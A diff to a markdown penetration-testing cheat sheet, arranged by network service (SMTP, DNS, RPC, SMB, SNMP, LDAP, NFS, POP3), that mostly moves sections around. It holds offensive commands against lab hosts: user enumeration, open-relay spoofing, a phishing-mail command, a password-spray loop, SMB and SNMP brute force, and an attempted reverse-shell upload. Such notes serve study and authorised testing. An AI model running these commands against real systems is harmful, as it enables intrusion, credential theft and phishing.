@@ -166,6 +166,7 @@ By exploiting this vulnerability, you can get access to the **root** account on 
 </details> 
 
 <details>
+ 
 <summary>2.🔒 SSH (Secure Shell) port 22 </summary>
  <br>
 **Secure Shell (SSH)** is a cryptographic network protocol designed for secure communication over an unsecured network. It is primarily used for remote login and command-line execution, replacing older, less secure protocols like Telnet and rlogin
@@ -297,55 +298,67 @@ Result: Got the SSH shell
 
 </details>
 <details>
-<summary>3.📡 SNMP (Simple Network Management Protocol) port 25</summary>
+ <summary>3. SMTP (Simple Mail Transfer Protocol) port 25</summary>
  <br>
+SMTP is used for sending and receiving emails. It can be exploited in cases of misconfiguration, such as **open relay** or **user enumeration**.
 
-SNMP is used to manage and monitor network devices. It can be exploited if the community string is weak or known (like **public** or **private**).
-![image](https://github.com/user-attachments/assets/c4d02453-3331-4739-bf58-f38aea7a6133)
+**Enumerating SMTP:**
 
-**Example SNMP enumeration with `snmpcheck`:**
+```bash
+nc -nv <IP> 25 #Version Detection
+smtp-user-enum -M VRFY -U username.txt -t <IP> # -M means mode; it can be RCPT, VRFY, EXPN
+
+#Sending email with valid credentials, the below is an example of Phishing mail attack
+sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
+
+```
+
+This can be used to find valid email addresses on the target system.
+
+**Exploiting Open Relay (sending emails):**
 
 ```bash
 
-snmpcheck -c public -h 192.168.188.131
-snmpcheck -t <IP> -c public #Better version than snmpwalk as it displays more user friendly
-
-snmpwalk -c public -v1 -t 10 <IP> #Displays entire MIB tree, MIB Means Management Information Base
-snmpwalk -c public -v1 <IP> 1.3.6.1.4.1.77.1.2.25 #Windows User enumeration
-snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.4.2.1.2 #Windows Processes enumeration
-snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.6.3.1.2 #Installed software enumeraion
-snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.6.13.1.3 #Opened TCP Ports
-
-#Windows MIB values
-1.3.6.1.2.1.25.1.6.0 - System Processes
-1.3.6.1.2.1.25.4.2.1.2 - Running Programs
-1.3.6.1.2.1.25.4.2.1.4 - Processes Path
-1.3.6.1.2.1.25.2.3.1.4 - Storage Units
-1.3.6.1.2.1.25.6.3.1.2 - Software Name
-1.3.6.1.4.1.77.1.2.25 - User Accounts
-1.3.6.1.2.1.6.13.1.3 - TCP Local Ports
+telnet <IP> 25
+HELO attacker.com
+MAIL FROM: attacker@attacker.com
+RCPT TO: victim@victim.com
+DATA
+Subject: Test
+This is a test email.
+.
 
 ```
-if community string was public try to connect with snmpcheck
-![image](https://github.com/user-attachments/assets/1eef5dc1-7a3e-40e9-9b37-ce2bfea237d9)
-
-try to use snmp walk
-![image](https://github.com/user-attachments/assets/3a136368-a50b-4fb4-a7dd-63d72ed69358)
-
-**Brute-forcing SNMP community strings:**
-
-```bash
-
-onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 192.168.146.156
-or
-snmpwalk -v1 -c public 192.168.146.156 NET-SNMP-EXTEND-MIB :: nsExtendObjects
-
-```
-https://hacktricks.boitatech.com.br/pentesting/pentesting-snmp/snmp-rce
-
 </details>
+
 <details>
-<summary>4. HTTP/S (Hypertext Transfer Protocol) port 80, 443</summary>
+<summary>4. DNS (Domain Name System) port 53</summary>
+ <br>
+- Better use `Seclists` wordlists for better enumeration. https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS
+
+```
+host www.megacorpone.com
+host -t mx megacorpone.com
+host -t txt megacorpone.com
+
+for ip in $(cat list.txt); do host $ip.megacorpone.com; done #DNS Bruteforce
+for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not found" #bash bruteforcer to find domain name
+
+## DNS Recon
+dnsrecon -d megacorpone.com -t std #standard recon
+dnsrecon -d megacorpone.com -D ~/list.txt -t brt #bruteforce, hence we provided list
+
+# DNS Bruteforce using dnsenum
+dnsenum megacorpone.com
+
+## NSlookup, a gold mine
+nslookup mail.megacorptwo.com
+nslookup -type=TXT info.megacorptwo.com 192.168.50.151 #We are querying the information from a specific IP, here it is 192.168.50.151. This can be very useful
+```
+</details>
+
+<details>
+<summary>5. HTTP/S (Hypertext Transfer Protocol) port 80, 443</summary>
  <br>
 - View the source code and identify any hidden content. If an image looks suspicious, download it and try to find hidden data in it.
 - Identify the version or CMS and check for active exploits. This can be done using Nmap and Wappalyzer.
@@ -544,367 +557,7 @@ sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp" #/var/www
 </details>
 
 <details>
-<summary>4.🔌 RPC (Remote Procedure Call) port 111 </summary>
- <br>
-RPC allows a program on one computer to execute a procedure on another computer.
-
-**Enumerating with RPCClient:**
-**Connect to RPC server with an anonymous bind:**
-```bash
-
-$ rpcclient -U "" -N <target>
-srvinfo
-enumdomusers #Enumerate Domain Users
-enumpriv #like "whoami /priv"
-queryuser <user> #detailed user info
-getuserdompwinfo <RID> #password policy, get user-RID from previous command
-getdompwinfo #Get Domain Password Info
-lookupnames <user> #SID of specified user
-createdomuser <username> #Creating a user
-deletedomuser <username>
-enumdomains
-enumdomgroups # Enumerate Domain Groups
-querygroup <group-RID> #get rid from previous command
-querydispinfo #description of all users
-querygroupmem 0x200 #Query Group Membership
-netshareenum #Share enumeration, this only comesup if the current user we're logged in has permissions
-netshareenumall
-lsaenumsid #SID of all users
-
-```
-
-This will provide information about the target system and its users.
-![image](https://github.com/user-attachments/assets/1a5d498c-8a6d-4a91-b017-69b62a6cb5e2)
-
-“RID are relative identifier to identify an object which will be in hexa decimal format”
-
-![image](https://github.com/user-attachments/assets/d3e9af35-e0b2-4c72-b893-e7a24141b82a)
-
-**Password Spray Attack**
-
-The following script will iterate over usernames and passwords and try to execute "getusername". Watch out for "ACCOUNT_LOCKED" error messages.
-
-```
-TARGET=10.10.10.10;
-while read username; do
-  while read password; do
-    echo -n "[*] user: $username" && rpcclient -U "$username%$password" -c "getusername;quit" $TARGET | grep -v "NT_STATUS_ACCESS_DENIED";
-  done < /path/to/passwords.txt
-done < /path/to/usernames.txt
-```
-
-If a password is found, use it with smbclient to explore the SYSVOL:
-
-```
-$ smbclient -U "username%password" \\\\<target>\\SYSVOL
-Domain=[HOME] OS=[Windows Server 2008]
-...
-smb: \> ls
-...
-```
----
-</details>
-
-<details>
-<summary>3.🗂️ SMB (Server Message Block)</summary>
- <br>
-SMB is a protocol used for file and printer sharing, as well as inter-process communication between computers.
-
-**Example Nmap command to scan for SMB services:**
-
-```bash
-
-sudo nmap -p 445 -sV -sC 192.168.188.131
-locate .nse | grep smb
-nmap -p445 --script="name" $IP 
-
-```
-![image](https://github.com/user-attachments/assets/5f4b1ffc-baab-4de5-9c0f-dcb520401b1c)
-
-
-**Enumerating SMB Shares:**
-
-```bash
-#In windows we can view like this
-net view \\<computername/IP> /all
-
-enum4linux -L -S 192.168.188.131
-smbclient -L 192.168.188.131 -N
-smbmap -H 192.168.188.131
-#If you got user name and password:
-smbmap -H 192.168.188.131 -u "msfadmin" -p "msfadmin" -r tmp -A '.*' -q
-
-```
-
-**Brute-forcing SMB credentials:**
-
-```bash
-
-hydra -l admin -P /home/kali/pass.txt smb://192.168.188.131
-or
-netexec smb 192.168.188.131 -u admin -p /home/kali/pass.txt --continue-on-success
-
-```
-![image](https://github.com/user-attachments/assets/c592d34d-613f-49b5-9a92-c3b8c951958a)
-```bash
-# Smbclient
-smbclient -L //IP #or try with 4 /'s
-smbclient //server/share
-smbclient //server/share -U <username>
-smbclient //server/share -U domain/username
-
-#SMBmap
-smbmap -H <target_ip>
-smbmap -H <target_ip> -u <username> -p <password>
-smbmap -H <target_ip> -u <username> -p <password> -d <domain>
-smbmap -H <target_ip> -u <username> -p <password> -r <share_name>
-
-#Within SMB session
-put <file> #to upload file
-get <file> #to download file
-```
-Downloading shares is easy—if the folder consists of several files, they will all be downloaded by this.
-```bash
-mask ""
-recurse ON
-prompt OFF
-mget *
-```
-**Exploit SMB:**
-Try to connect with no pass
-
-```jsx
-smbclient --no-pass //192.168.188.131/tmp
-```
-
-login as Anonymous:
-
-![image](https://github.com/user-attachments/assets/1e13a6c6-3293-4bf3-a01e-bb3303698da0)
-
-
-since we have smb access i tried:
-```jsx
-put rev.sh
-posix 
-chmod +x rev.sh
-chown Anonymous rev.sh
-open rev.sh
-```
-But didnt work:
-Failed to open file /rev.sh. NT_STATUS_ACCESS_DENIED
-![image](https://github.com/user-attachments/assets/4a71afb8-42f0-471e-bebb-bc7bc0a83107)
-
-SMB Version Samba 3.0.20 found, search for exploits:
-```bash
-searchsploit samba 3.0.20  
-locate multiple/remote/10095.txt
-cat /usr/share/exploitdb/exploits/multiple/remote/10095.txt
-```
-![image](https://github.com/user-attachments/assets/6603e3bd-03ea-4424-8d4c-f3aac3acdd52)
-
-</details>
-
-<details>
-<summary>11. DNS (Domain Name System)</summary>
- <br>
-- Better use `Seclists` wordlists for better enumeration. https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS
-
-```
-host www.megacorpone.com
-host -t mx megacorpone.com
-host -t txt megacorpone.com
-
-for ip in $(cat list.txt); do host $ip.megacorpone.com; done #DNS Bruteforce
-for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not found" #bash bruteforcer to find domain name
-
-## DNS Recon
-dnsrecon -d megacorpone.com -t std #standard recon
-dnsrecon -d megacorpone.com -D ~/list.txt -t brt #bruteforce, hence we provided list
-
-# DNS Bruteforce using dnsenum
-dnsenum megacorpone.com
-
-## NSlookup, a gold mine
-nslookup mail.megacorptwo.com
-nslookup -type=TXT info.megacorptwo.com 192.168.50.151 #We are querying the information from a specific IP, here it is 192.168.50.151. This can be very useful
-```
-</details>
-
-
-<details>
-<summary>2.📦 NFS (Network File System)</summary>
- <br>
-NFS allows a system to share its files with other systems over a network. It enables the mounting of remote file systems and interaction with them as if they were local.
-
-**Example Nmap command to scan for NFS services:**
-
-```bash
-
-nmap -p2049 -sV 192.168.188.131
-
-```
-
-If NFS is exposed publicly, it can be mounted to the local machine and files can be accessed.
-
-**Mounting NFS share:**
-
-```bash
-
-sudo mount 192.168.188.131:/ /home/kali/Downloads/nfs -nolock
-
-```
-
-This allows you to access shared files from the remote NFS server.
-![image](https://github.com/user-attachments/assets/34ad4003-778a-4011-b5ee-1c63e17adf4a)
-
-**Troubleshooting NFS Mount Permission Issues:**
-
-If you encounter **Permission Denied**, ensure that you have the correct NFS version and permissions configured.
-https://blog.christophetd.fr/write-up-vulnix/
-**To use NFSv3 (if needed):**
-
-```bash
-
-sudo mount -t nfs -o vers=3 192.168.188.137:/home/vulnix /home/kali/Downloads/nfs/home/vulnix -nolock
-
-```
-Let’s take a closer look at the permissions. 
-```bash
-ls -ld vulnix
-```
-If only Particuler user or group have access to the Path:
-create a user group:
-```jsx
-sudo groupadd --gid 2008 vulnix_group
-sudo useradd --uid 2008 --groups vulnix_group vulnix
-sudo -u vulnix ls -l vulnix
-```
-
-![image](https://github.com/user-attachments/assets/c5978efc-c909-48b1-8165-5705d484ef0a)
-
-
-DEBUG
-
-```jsx
-id vulnix
-```
-
-Ensure it outputs:
-
-```jsx
-uid=2008(vulnix) gid=2008(vulnix_group) groups=2008(vulnix_group)
-```
-
-If the UID or GID is incorrect, you must delete and recreate the user with:
-
-```jsx
-sudo userdel vulnix
-sudo groupdel vulnix_group
-sudo groupadd --gid 2008 vulnix_group
-sudo useradd --uid 2008 --gid 2008 --groups vulnix_group vulnix
-```
-
-Now, try accessing the directory as `vulnix_user`:
-![image](https://github.com/user-attachments/assets/90546368-1291-4e7a-b7c9-52a148eef779)
-
-</details>
-
-
-
-
-
-
-
-<details>
-<summary>6.📚 LDAP (Lightweight Directory Access Protocol)</summary>
- <br>
-LDAP is a protocol used to access and maintain directory information. It is commonly used for managing user information and authentication.
-
-**Enumerating LDAP:**
-
-```bash
-
-ldapsearch -x -H ldap://<IP> -b "dc=example,dc=com"
-ldapsearch -x -H ldap://<IP>:<port> # try on both ldap and ldaps, this is first command to run if you dont have any valid credentials.
-
-ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
-ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
-#CN name describes the info we're collecting
-ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
-ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Computers,DC=<1_SUBDOMAIN>,DC=<TLD>"
-ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
-ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Users,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
-ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Enterprise Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
-ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
-ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Remote Desktop Users,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
-
-#windapsearch.py
-#for computers
-python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --computers
-
-#for groups
-python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --groups
-
-#for users
-python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --da
-
-#for privileged users
-python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --privileged-users
-
-```
-
-You can also enumerate users and gather information from LDAP directories.
-
-**Using Metasploit for LDAP enumeration:**
-
-```bash
-
-msfconsole
-use auxiliary/gather/ldap_query
-set RHOSTS <IP>
-set BASE "dc=example,dc=com"
-run
-
-```
-
-</details>
-
-<details>
- <summary>7. SMTP (Simple Mail Transfer Protocol)</summary>
- <br>
-SMTP is used for sending and receiving emails. It can be exploited in cases of misconfiguration, such as **open relay** or **user enumeration**.
-
-**Enumerating SMTP:**
-
-```bash
-nc -nv <IP> 25 #Version Detection
-smtp-user-enum -M VRFY -U username.txt -t <IP> # -M means mode; it can be RCPT, VRFY, EXPN
-
-#Sending email with valid credentials, the below is an example of Phishing mail attack
-sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
-
-```
-
-This can be used to find valid email addresses on the target system.
-
-**Exploiting Open Relay (sending emails):**
-
-```bash
-
-telnet <IP> 25
-HELO attacker.com
-MAIL FROM: attacker@attacker.com
-RCPT TO: victim@victim.com
-DATA
-Subject: Test
-This is a test email.
-.
-
-```
-</details>
-
-<details>
-<summary>8. POP3 (Post Office Protocol Version 3)</summary>
+<summary>5. POP3 (Post Office Protocol Version 3) port 110</summary>
  <br>
 **Post Office Protocol** \(**POP**\) is a type of computer networking and Internet standard **protocol** that extracts and retrieves email from a remote mail server for access by the host machine. **POP** is an application layer **protocol** in the OSI model that provides end users the ability to fetch and receive email \(from [here](https://www.techopedia.com/definition/5383/post-office-protocol-pop)\).
 
@@ -1012,6 +665,361 @@ hydra -l <username> -P /usr/share/wordlists/rockyou.txt -s 110 -vV <IP> pop3
 - HackTricks - POP3
 - POP3 RFC 1939
 </details>
+
+
+
+<details>
+<summary>6.🔌 RPC (Remote Procedure Call) port 111 </summary>
+ <br>
+RPC allows a program on one computer to execute a procedure on another computer.
+
+**Enumerating with RPCClient:**
+**Connect to RPC server with an anonymous bind:**
+```bash
+
+$ rpcclient -U "" -N <target>
+srvinfo
+enumdomusers #Enumerate Domain Users
+enumpriv #like "whoami /priv"
+queryuser <user> #detailed user info
+getuserdompwinfo <RID> #password policy, get user-RID from previous command
+getdompwinfo #Get Domain Password Info
+lookupnames <user> #SID of specified user
+createdomuser <username> #Creating a user
+deletedomuser <username>
+enumdomains
+enumdomgroups # Enumerate Domain Groups
+querygroup <group-RID> #get rid from previous command
+querydispinfo #description of all users
+querygroupmem 0x200 #Query Group Membership
+netshareenum #Share enumeration, this only comesup if the current user we're logged in has permissions
+netshareenumall
+lsaenumsid #SID of all users
+
+```
+
+This will provide information about the target system and its users.
+![image](https://github.com/user-attachments/assets/1a5d498c-8a6d-4a91-b017-69b62a6cb5e2)
+
+“RID are relative identifier to identify an object which will be in hexa decimal format”
+
+![image](https://github.com/user-attachments/assets/d3e9af35-e0b2-4c72-b893-e7a24141b82a)
+
+**Password Spray Attack**
+
+The following script will iterate over usernames and passwords and try to execute "getusername". Watch out for "ACCOUNT_LOCKED" error messages.
+
+```
+TARGET=10.10.10.10;
+while read username; do
+  while read password; do
+    echo -n "[*] user: $username" && rpcclient -U "$username%$password" -c "getusername;quit" $TARGET | grep -v "NT_STATUS_ACCESS_DENIED";
+  done < /path/to/passwords.txt
+done < /path/to/usernames.txt
+```
+
+If a password is found, use it with smbclient to explore the SYSVOL:
+
+```
+$ smbclient -U "username%password" \\\\<target>\\SYSVOL
+Domain=[HOME] OS=[Windows Server 2008]
+...
+smb: \> ls
+...
+```
+---
+</details>
+
+<details>
+<summary>7.🗂️ SMB (Server Message Block) port 139,445</summary>
+ <br>
+SMB is a protocol used for file and printer sharing, as well as inter-process communication between computers.
+
+**Example Nmap command to scan for SMB services:**
+
+```bash
+
+sudo nmap -p 445 -sV -sC 192.168.188.131
+locate .nse | grep smb
+nmap -p445 --script="name" $IP 
+
+```
+![image](https://github.com/user-attachments/assets/5f4b1ffc-baab-4de5-9c0f-dcb520401b1c)
+
+
+**Enumerating SMB Shares:**
+
+```bash
+#In windows we can view like this
+net view \\<computername/IP> /all
+
+enum4linux -L -S 192.168.188.131
+smbclient -L 192.168.188.131 -N
+smbmap -H 192.168.188.131
+#If you got user name and password:
+smbmap -H 192.168.188.131 -u "msfadmin" -p "msfadmin" -r tmp -A '.*' -q
+
+```
+
+**Brute-forcing SMB credentials:**
+
+```bash
+
+hydra -l admin -P /home/kali/pass.txt smb://192.168.188.131
+or
+netexec smb 192.168.188.131 -u admin -p /home/kali/pass.txt --continue-on-success
+
+```
+![image](https://github.com/user-attachments/assets/c592d34d-613f-49b5-9a92-c3b8c951958a)
+```bash
+# Smbclient
+smbclient -L //IP #or try with 4 /'s
+smbclient //server/share
+smbclient //server/share -U <username>
+smbclient //server/share -U domain/username
+
+#SMBmap
+smbmap -H <target_ip>
+smbmap -H <target_ip> -u <username> -p <password>
+smbmap -H <target_ip> -u <username> -p <password> -d <domain>
+smbmap -H <target_ip> -u <username> -p <password> -r <share_name>
+
+#Within SMB session
+put <file> #to upload file
+get <file> #to download file
+```
+Downloading shares is easy—if the folder consists of several files, they will all be downloaded by this.
+```bash
+mask ""
+recurse ON
+prompt OFF
+mget *
+```
+**Exploit SMB:**
+Try to connect with no pass
+
+```jsx
+smbclient --no-pass //192.168.188.131/tmp
+```
+
+login as Anonymous:
+
+![image](https://github.com/user-attachments/assets/1e13a6c6-3293-4bf3-a01e-bb3303698da0)
+
+
+since we have smb access i tried:
+```jsx
+put rev.sh
+posix 
+chmod +x rev.sh
+chown Anonymous rev.sh
+open rev.sh
+```
+But didnt work:
+Failed to open file /rev.sh. NT_STATUS_ACCESS_DENIED
+![image](https://github.com/user-attachments/assets/4a71afb8-42f0-471e-bebb-bc7bc0a83107)
+
+SMB Version Samba 3.0.20 found, search for exploits:
+```bash
+searchsploit samba 3.0.20  
+locate multiple/remote/10095.txt
+cat /usr/share/exploitdb/exploits/multiple/remote/10095.txt
+```
+![image](https://github.com/user-attachments/assets/6603e3bd-03ea-4424-8d4c-f3aac3acdd52)
+
+</details>
+<details>
+<summary>8.📡 SNMP (Simple Network Management Protocol) port 25</summary>
+ <br>
+
+SNMP is used to manage and monitor network devices. It can be exploited if the community string is weak or known (like **public** or **private**).
+![image](https://github.com/user-attachments/assets/c4d02453-3331-4739-bf58-f38aea7a6133)
+
+**Example SNMP enumeration with `snmpcheck`:**
+
+```bash
+
+snmpcheck -c public -h 192.168.188.131
+snmpcheck -t <IP> -c public #Better version than snmpwalk as it displays more user friendly
+
+snmpwalk -c public -v1 -t 10 <IP> #Displays entire MIB tree, MIB Means Management Information Base
+snmpwalk -c public -v1 <IP> 1.3.6.1.4.1.77.1.2.25 #Windows User enumeration
+snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.4.2.1.2 #Windows Processes enumeration
+snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.6.3.1.2 #Installed software enumeraion
+snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.6.13.1.3 #Opened TCP Ports
+
+#Windows MIB values
+1.3.6.1.2.1.25.1.6.0 - System Processes
+1.3.6.1.2.1.25.4.2.1.2 - Running Programs
+1.3.6.1.2.1.25.4.2.1.4 - Processes Path
+1.3.6.1.2.1.25.2.3.1.4 - Storage Units
+1.3.6.1.2.1.25.6.3.1.2 - Software Name
+1.3.6.1.4.1.77.1.2.25 - User Accounts
+1.3.6.1.2.1.6.13.1.3 - TCP Local Ports
+
+```
+if community string was public try to connect with snmpcheck
+![image](https://github.com/user-attachments/assets/1eef5dc1-7a3e-40e9-9b37-ce2bfea237d9)
+
+try to use snmp walk
+![image](https://github.com/user-attachments/assets/3a136368-a50b-4fb4-a7dd-63d72ed69358)
+
+**Brute-forcing SNMP community strings:**
+
+```bash
+
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 192.168.146.156
+or
+snmpwalk -v1 -c public 192.168.146.156 NET-SNMP-EXTEND-MIB :: nsExtendObjects
+
+```
+https://hacktricks.boitatech.com.br/pentesting/pentesting-snmp/snmp-rce
+
+</details>
+
+<details>
+<summary>9.📚 LDAP (Lightweight Directory Access Protocol)389,636</summary>
+ <br>
+LDAP is a protocol used to access and maintain directory information. It is commonly used for managing user information and authentication.
+
+**Enumerating LDAP:**
+
+```bash
+
+ldapsearch -x -H ldap://<IP> -b "dc=example,dc=com"
+ldapsearch -x -H ldap://<IP>:<port> # try on both ldap and ldaps, this is first command to run if you dont have any valid credentials.
+
+ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
+ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
+#CN name describes the info we're collecting
+ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
+ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Computers,DC=<1_SUBDOMAIN>,DC=<TLD>"
+ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
+ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Users,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
+ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Enterprise Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
+ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
+ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Remote Desktop Users,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
+
+#windapsearch.py
+#for computers
+python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --computers
+
+#for groups
+python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --groups
+
+#for users
+python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --da
+
+#for privileged users
+python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --privileged-users
+
+```
+
+You can also enumerate users and gather information from LDAP directories.
+
+**Using Metasploit for LDAP enumeration:**
+
+```bash
+
+msfconsole
+use auxiliary/gather/ldap_query
+set RHOSTS <IP>
+set BASE "dc=example,dc=com"
+run
+
+```
+
+</details>
+<details>
+<summary>10.📦 NFS (Network File System) port 2049</summary>
+ <br>
+NFS allows a system to share its files with other systems over a network. It enables the mounting of remote file systems and interaction with them as if they were local.
+
+**Example Nmap command to scan for NFS services:**
+
+```bash
+
+nmap -p2049 -sV 192.168.188.131
+
+```
+
+If NFS is exposed publicly, it can be mounted to the local machine and files can be accessed.
+
+**Mounting NFS share:**
+
+```bash
+
+sudo mount 192.168.188.131:/ /home/kali/Downloads/nfs -nolock
+
+```
+
+This allows you to access shared files from the remote NFS server.
+![image](https://github.com/user-attachments/assets/34ad4003-778a-4011-b5ee-1c63e17adf4a)
+
+**Troubleshooting NFS Mount Permission Issues:**
+
+If you encounter **Permission Denied**, ensure that you have the correct NFS version and permissions configured.
+https://blog.christophetd.fr/write-up-vulnix/
+**To use NFSv3 (if needed):**
+
+```bash
+
+sudo mount -t nfs -o vers=3 192.168.188.137:/home/vulnix /home/kali/Downloads/nfs/home/vulnix -nolock
+
+```
+Let’s take a closer look at the permissions. 
+```bash
+ls -ld vulnix
+```
+If only Particuler user or group have access to the Path:
+create a user group:
+```jsx
+sudo groupadd --gid 2008 vulnix_group
+sudo useradd --uid 2008 --groups vulnix_group vulnix
+sudo -u vulnix ls -l vulnix
+```
+
+![image](https://github.com/user-attachments/assets/c5978efc-c909-48b1-8165-5705d484ef0a)
+
+
+DEBUG
+
+```jsx
+id vulnix
+```
+
+Ensure it outputs:
+
+```jsx
+uid=2008(vulnix) gid=2008(vulnix_group) groups=2008(vulnix_group)
+```
+
+If the UID or GID is incorrect, you must delete and recreate the user with:
+
+```jsx
+sudo userdel vulnix
+sudo groupdel vulnix_group
+sudo groupadd --gid 2008 vulnix_group
+sudo useradd --uid 2008 --gid 2008 --groups vulnix_group vulnix
+```
+
+Now, try accessing the directory as `vulnix_user`:
+![image](https://github.com/user-attachments/assets/90546368-1291-4e7a-b7c9-52a148eef779)
+
+</details>
+
+
+<details>
+<summary>11. mysql  port 3306</summary>
+ <br>
+
+
+</details>
+
+
+
+
+
 
 
   
